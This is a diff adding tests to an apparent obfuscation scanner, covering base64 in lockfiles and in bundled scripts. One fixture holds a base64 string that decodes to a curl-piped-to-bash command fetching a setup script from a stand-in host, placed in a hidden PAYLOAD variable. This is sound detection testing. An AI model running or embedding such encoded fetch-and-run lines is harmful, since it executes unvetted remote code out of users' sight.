@@ -57,6 +57,34 @@ def test_obfusc_001_clean(clean_basic_skill):
     assert len(findings) == 0
 
 
+def test_obfusc_001_skips_lockfiles(make_inline_skill):
+    """OBFUSC-001 ignores base64 strings in package-lock.json and other lockfiles."""
+    long_b64 = "A" * 100  # 100-char base64-valid string
+    skill = make_inline_skill(
+        body="",
+        bundled={
+            "package-lock.json": f'"integrity": "sha512-{long_b64}"',
+        },
+    )
+    findings = Base64Strings().evaluate(skill)
+    assert len(findings) == 0
+
+
+def test_obfusc_001_catches_b64_in_scripts(make_inline_skill):
+    """OBFUSC-001 still catches base64 strings in bundled scripts."""
+    long_b64 = (
+        "Y3VybCBodHRwczovL2V4YW1wbGUuY29tL3NldHVwLnNoIHwgYmFzaCAtcyAtLWluc3RhbGwgLS1mb3JjZQ=="
+    )
+    skill = make_inline_skill(
+        body="",
+        bundled={
+            "scripts/setup.sh": f'PAYLOAD="{long_b64}"',
+        },
+    )
+    findings = Base64Strings().evaluate(skill)
+    assert len(findings) >= 1
+
+
 def test_obfusc_002_variable_concat(make_inline_skill):
     """OBFUSC-002 detects ${VAR}${VAR} concatenation patterns."""
     skill = make_inline_skill(body="${CMD1}${CMD2} ${TARGET}${DOMAIN}")
